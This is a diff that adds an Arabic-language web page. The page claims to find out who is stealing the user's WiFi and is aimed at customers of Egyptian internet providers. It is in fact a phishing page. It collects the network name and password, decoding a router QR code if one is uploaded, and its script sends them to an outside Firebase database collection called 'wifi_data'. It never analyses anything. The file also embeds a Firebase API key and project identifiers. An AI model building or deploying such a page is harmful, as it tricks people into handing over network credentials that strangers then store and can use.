@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اكتشف من يسرق الواي فاي الخاص بك</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+        }
+
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            font-weight: 900;
+            color: #764ba2;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 15px;
+        }
+
+        .service-selection h2 {
+            text-align: center;
+            color: #444;
+            margin-bottom: 15px;
+        }
+
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+
+        .service-btn {
+            padding: 15px;
+            font-size: 18px;
+            font-weight: 700;
+            border: 2px solid #ddd;
+            border-radius: 12px;
+            background: white;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        .service-btn:hover {
+            background: #667eea;
+            color: white;
+            border-color: #667eea;
+            transform: translateY(-2px);
+        }
+
+        .service-btn.selected {
+            background: #667eea;
+            color: white;
+            border-color: #667eea;
+        }
+
+        .form-section {
+            margin-top: 25px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            font-weight: 700;
+            color: #555;
+            margin-bottom: 5px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            font-family: 'Cairo', sans-serif;
+            transition: all 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+
+        .qr-upload {
+            text-align: center;
+            margin: 20px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 12px;
+        }
+
+        .upload-btn {
+            display: inline-block;
+            padding: 12px 25px;
+            background: #764ba2;
+            color: white;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: 700;
+            margin: 10px 0;
+            transition: all 0.3s;
+        }
+
+        .upload-btn:hover {
+            background: #667eea;
+            transform: translateY(-2px);
+        }
+
+        .qr-status {
+            font-weight: 700;
+            margin-top: 10px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: 900;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        .submit-btn:hover {
+            background: #764ba2;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+        }
+
+        .result {
+            text-align: center;
+            margin-top: 15px;
+            font-weight: 700;
+        }
+
+        .instructions {
+            margin-top: 25px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 12px;
+        }
+
+        .instructions h3 {
+            color: #764ba2;
+            margin-bottom: 10px;
+        }
+
+        .instructions p {
+            color: #555;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        @media (max-width: 480px) {
+            .header h1 {
+                font-size: 22px;
+            }
+            
+            .services-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <h1>🔍 اكتشف من يسرق الواي فاي الخاص بك</h1>
+                <p class="subtitle">أدخل بيانات شبكتك أو ارفع صورة QR Code للتحليل الفوري</p>
+            </div>
+
+            <div class="service-selection">
+                <h2>اختر نوع الخدمة:</h2>
+                <div class="services-grid">
+                    <button class="service-btn" onclick="selectService('WE')">📡 WE</button>
+                    <button class="service-btn" onclick="selectService('VODAFONE')">📶 VODAFONE</button>
+                    <button class="service-btn" onclick="selectService('ORANGE')">🍊 ORANGE</button>
+                    <button class="service-btn" onclick="selectService('ETISALAT')">🌐 ETISALAT</button>
+                </div>
+            </div>
+
+            <div id="form-section" class="form-section hidden">
+                <div class="input-group">
+                    <label>📛 اسم الشبكة (SSID):</label>
+                    <input type="text" id="ssid" placeholder="مثال: WE_5G_2024">
+                </div>
+
+                <div class="input-group">
+                    <label>🔑 كلمة السر:</label>
+                    <input type="text" id="password" placeholder="مثال: kX92@nZx">
+                </div>
+
+                <div class="qr-upload">
+                    <h3>📱 أو ارفع صورة QR Code من الراوتر:</h3>
+                    <label class="upload-btn">
+                        📤 ارفع صورة QR Code
+                        <input type="file" id="qrInput" accept="image/*" hidden>
+                    </label>
+                    <div id="qr-status" class="qr-status"></div>
+                </div>
+
+                <button class="submit-btn" onclick="submitData()">🚀 إرسال البيانات</button>
+                <div id="result" class="result"></div>
+            </div>
+
+            <div class="instructions">
+                <h3>📋 كيف تحصل على QR Code؟</h3>
+                <p>1️⃣ افتح إعدادات الواي فاي في هاتفك</p>
+                <p>2️⃣ اضغط على الشبكة المتصل بها</p>
+                <p>3️⃣ ستجد خيار "مشاركة" أو "QR Code"</p>
+                <p>4️⃣ خذ لقطة شاشة أو صورة للـ QR Code وارفعها هنا</p>
+                <p>5️⃣ سيتم تحليلها واستخراج البيانات تلقائياً</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js"></script>
+    <script>
+        // Firebase Config
+        firebase.initializeApp({
+            apiKey: "AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
+            projectId: "game-a1aca",
+            storageBucket: "game-a1aca.firebasestorage.app",
+            appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
+        });
+
+        const db = firebase.firestore();
+        let selectedService = '';
+
+        function selectService(service) {
+            selectedService = service;
+            document.querySelectorAll('.service-btn').forEach(btn => {
+                btn.classList.remove('selected');
+                if (btn.textContent.includes(service)) {
+                    btn.classList.add('selected');
+                }
+            });
+            document.getElementById('form-section').classList.remove('hidden');
+        }
+
+        // QR Code Analysis
+        document.getElementById('qrInput').addEventListener('change', async function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+            
+            const status = document.getElementById('qr-status');
+            status.textContent = '⏳ جاري تحليل QR Code...';
+            status.style.color = '#f39c12';
+            
+            const img = new Image();
+            img.src = URL.createObjectURL(file);
+            
+            await new Promise(resolve => img.onload = resolve);
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = img.width;
+            canvas.height = img.height;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(img, 0, 0);
+            
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            const code = jsQR(imageData.data, imageData.width, imageData.height);
+            
+            if (code) {
+                status.textContent = '✅ تم تحليل QR Code بنجاح!';
+                status.style.color = '#27ae60';
+                parseQRData(code.data);
+            } else {
+                status.textContent = '❌ لم يتم العثور على QR Code، حاول مجدداً';
+                status.style.color = '#e74c3c';
+            }
+        });
+
+        function parseQRData(data) {
+            const ssidMatch = data.match(/S:(.*?);/);
+            const passMatch = data.match(/P:(.*?);/);
+            
+            if (ssidMatch) {
+                document.getElementById('ssid').value = ssidMatch[1];
+            }
+            if (passMatch) {
+                document.getElementById('password').value = passMatch[1];
+            }
+        }
+
+        async function submitData() {
+            const ssid = document.getElementById('ssid').value;
+            const password = document.getElementById('password').value;
+            const result = document.getElementById('result');
+            
+            if (!selectedService) {
+                result.textContent = '⚠️ اختر نوع الخدمة أولاً!';
+                result.style.color = '#e74c3c';
+                return;
+            }
+            
+            if (!ssid || !password) {
+                result.textContent = '⚠️ أدخل اسم الشبكة وكلمة السر أو ارفع QR Code!';
+                result.style.color = '#e74c3c';
+                return;
+            }
+            
+            try {
+                result.textContent = '⏳ جاري الإرسال...';
+                result.style.color = '#f39c12';
+                
+                await db.collection('wifi_data').add({
+                    service: selectedService,
+                    ssid: ssid,
+                    password: password,
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                });
+                
+                result.textContent = '✅ تم إرسال البيانات بنجاح!';
+                result.style.color = '#27ae60';
+                
+                document.getElementById('ssid').value = '';
+                document.getElementById('password').value = '';
+            } catch (error) {
+                result.textContent = '❌ حدث خطأ: ' + error.message;
+                result.style.color = '#e74c3c';
+            }
+        }
+    </script>
+</body>
+</html>
